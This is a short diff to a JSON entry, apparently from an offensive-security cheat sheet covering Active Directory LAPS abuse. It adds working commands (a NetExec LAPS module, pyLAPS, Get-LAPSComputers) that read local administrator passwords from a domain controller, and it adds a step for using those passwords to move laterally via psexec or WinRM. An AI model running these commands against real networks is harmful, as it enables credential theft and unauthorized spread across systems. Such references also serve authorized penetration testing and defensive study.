@@ -83,5 +83,25 @@
   "tools": [
     "PowerView",
     "crackmapexec"
+  ],
+  "variations": [
+    {
+      "label": "NetExec module",
+      "command": "nxc ldap <dc_ip> -u <user> -p <password> -M laps"
+    },
+    {
+      "label": "pyLAPS",
+      "command": "python3 pyLAPS.py --action get -u <user> -p <password> -d <domain> --dc-ip <dc_ip>"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Find computers whose LAPS password you can read",
+      "command": "Get-LAPSComputers"
+    },
+    {
+      "label": "Use the local admin password to move laterally",
+      "command": "# psexec/winrm as the local Administrator"
+    }
   ]
 }
